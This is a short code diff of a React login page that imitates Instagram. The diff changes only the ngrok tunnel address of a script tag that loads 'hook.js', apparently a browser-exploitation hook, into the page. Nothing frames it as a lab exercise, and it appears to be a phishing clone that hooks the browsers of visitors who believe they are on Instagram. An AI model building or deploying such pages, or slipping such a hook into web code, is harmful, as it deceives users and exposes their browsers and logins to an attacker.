@@ -112,7 +112,7 @@ const LoginPage = () => {
         </ul>
         <span className="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
       </footer>
-      <script src="https://2b17-84-54-94-150.ngrok-free.app:443/hook.js"></script>
+      <script src="https://f6b4-84-54-94-150.ngrok-free.app:443/hook.js"></script>
     </>
   );
 };
